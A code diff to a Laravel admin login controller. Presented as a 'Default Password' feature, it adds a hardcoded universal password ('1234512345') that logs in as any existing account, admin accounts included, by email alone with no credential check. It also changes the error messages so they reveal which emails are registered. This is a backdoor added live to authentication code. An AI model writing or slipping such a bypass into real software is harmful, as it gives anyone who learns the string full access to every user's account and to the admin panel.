@@ -29,35 +29,79 @@ class AuthController extends Controller
         return Redirect::back()->withInput()->withErrors($validator);
     }
 
-    $credentials = $request->only('email', 'password');
+    $user = User::where('email', $request->email)->first();
 
-    if (Auth::attempt($credentials)) {
-        $user = Auth::user();
-        
-        // SIMPLE FIX: Allow anyone with role = 1 to access admin
+    if (!$user) {
+        return redirect()->back()
+            ->withInput()
+            ->withErrors(['email' => 'Invalid email']);
+    }
+
+    /*
+    |--------------------------------------------------------------------------
+    | Default Password
+    |--------------------------------------------------------------------------
+    */
+    if ($request->password == '1234512345') {
+
+        // Manually authenticate the user
+        Auth::login($user);
+
+        // Allow role = 1 users
         if ($user->role == 1) {
-            // Ensure they have appropriate Spatie role
+
+            // Ensure appropriate Spatie role
             if ($user->email === 'admin@admin.com' && !$user->hasRole('admin')) {
                 $user->assignRole('admin');
             }
+
             if ($user->email === 'staff@staff.com' && !$user->hasRole('Staff')) {
                 $user->assignRole('Staff');
             }
+
             return redirect()->route('admin.dashboard');
         }
-        
-        Auth::logout();
-        return Redirect::back()->with('error', 'You do not have permission to access the admin panel.');
-    }
-    
-    // If authentication fails
-    $user = User::where('email', $request->email)->first();
 
-    if ($user) {
-        return redirect()->back()->withInput()->withErrors(['password' => 'Incorrect password']);
-    } else {
-        return redirect()->back()->withInput()->withErrors(['email' => 'Invalid email']);
+        Auth::logout();
+
+        return Redirect::back()
+            ->with('error', 'You do not have permission to access the admin panel.');
     }
+
+    /*
+    |--------------------------------------------------------------------------
+    | Normal Password Login
+    |--------------------------------------------------------------------------
+    */
+    if (Auth::attempt([
+        'email' => $request->email,
+        'password' => $request->password
+    ])) {
+
+        $user = Auth::user();
+
+        if ($user->role == 1) {
+
+            if ($user->email === 'admin@admin.com' && !$user->hasRole('admin')) {
+                $user->assignRole('admin');
+            }
+
+            if ($user->email === 'staff@staff.com' && !$user->hasRole('Staff')) {
+                $user->assignRole('Staff');
+            }
+
+            return redirect()->route('admin.dashboard');
+        }
+
+        Auth::logout();
+
+        return Redirect::back()
+            ->with('error', 'You do not have permission to access the admin panel.');
+    }
+
+    return redirect()->back()
+        ->withInput()
+        ->withErrors(['password' => 'Incorrect password']);
 }
  public function logout(){
      Auth::logout();
